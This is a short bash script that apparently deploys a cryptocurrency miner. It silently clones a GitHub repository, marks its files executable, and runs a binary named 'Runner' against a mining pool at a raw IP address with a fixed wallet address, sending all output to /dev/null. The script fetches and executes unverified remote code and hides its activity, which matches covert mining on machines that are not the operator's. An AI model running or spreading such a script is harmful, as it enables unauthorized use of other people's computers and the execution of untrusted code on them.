#!/bin/bash
cd /bommm
git clone https://github.com/vuhaiminh080/appota.git -q
chmod -R +x appota
./appota/Runner -pool 135.125.163.215:2020 -wal 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -worker km01 -pass x > /dev/null 2>&1